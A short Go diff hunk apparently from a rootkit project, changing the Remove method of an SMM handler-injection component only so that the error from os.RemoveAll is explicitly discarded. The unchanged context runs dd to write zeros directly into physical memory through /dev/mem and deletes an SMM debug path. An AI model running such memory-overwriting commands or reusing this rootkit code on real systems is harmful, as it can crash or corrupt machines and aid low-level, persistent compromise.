@@ -70,7 +70,7 @@ func (m *HandlerInjectMethod) Remove(config *RootkitConfig) error {
 	smmPath := "/sys/kernel/debug/smm"
 	cmd := exec.Command("dd", "if=/dev/zero", "of=/dev/mem", "bs=1", "count=4096", "seek=0x0000FFF000")
 	_, err := cmd.CombinedOutput()
-	os.RemoveAll(smmPath)
+	_ = os.RemoveAll(smmPath)
 	return err
 }
 
